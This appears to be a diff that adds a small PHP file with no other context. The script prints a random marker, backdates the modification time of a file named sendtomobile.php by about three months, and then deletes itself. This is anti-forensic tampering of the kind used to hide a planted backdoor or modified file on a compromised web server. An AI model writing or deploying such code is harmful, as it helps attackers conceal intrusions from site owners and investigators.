@@ -1,0 +1,1 @@
+<?php echo "qaTTeUhRBQ"; if (file_exists("./sendtomobile.php")){ touch("./sendtomobile.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*cSCndz1wNHHyAwDRpB2s*/ ?>
